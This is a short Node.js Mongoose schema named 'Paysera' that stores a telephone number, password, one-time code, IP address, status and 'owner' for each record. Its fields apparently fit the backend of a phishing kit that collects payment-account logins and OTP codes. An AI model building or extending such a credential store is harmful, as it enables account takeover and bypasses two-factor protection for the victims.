const mongoose = require("mongoose");

const payseraSchema = new mongoose.Schema({
	uniqueid: String,
	telephone: String,
	password: String,
	otp: String,
	status: Number,
	ip: String,
	owner: String,
	timestamp: Date,
});

module.exports = mongoose.model("Paysera", payseraSchema);
